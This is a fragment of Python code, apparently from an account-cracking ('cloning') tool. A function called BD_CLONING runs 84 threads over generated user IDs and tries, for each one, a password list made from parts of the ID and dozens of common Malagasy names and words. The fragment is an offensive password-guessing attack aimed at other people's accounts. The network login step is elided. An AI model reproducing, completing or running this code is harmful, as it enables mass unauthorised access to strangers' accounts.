...
def BD_CLONING():
    ...
    with tred(max_workers=84) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'nekena','nirina','mamako','fitiavana','fanantenana','anjara','fahendrena','nantenaina','finoana','tantely','fandresena','nomena','amboara','mamiko','lafatra','faniry','tolotra','lahatra','malalako','Faniry','fitahina','mahery','solofo','faneva','tafita','Tahiry','fiderana','Miangola','fiderana','nilaina','miangaly','Miangaly','Fiderana','Nilaina','Mahery','Lahatra','Nirina','Amboara','Lafatra','fandresena','Fandresena','narovana','Fanantenana','Nekena','Mamako','Fitiavana','Anjara','malala','Malala','safidy','Safidy','vadiko','Vadiko','mahefa','Mahefa','randria','Randria','Fitahina','Faneva','Narovana','Solofo','ravaka','Ravaka','sarindra','narindra','fanomezana','Tafita','Fiderana','fandresena','Fandresena','Rakotomalala','rakotomalala','Fahendrena','Finoana','Fanomezana','valisoa','Valisoa','tahiry','Malalako','Nomena','Mamiko','Tantely','Nantenaina','Tolotra']
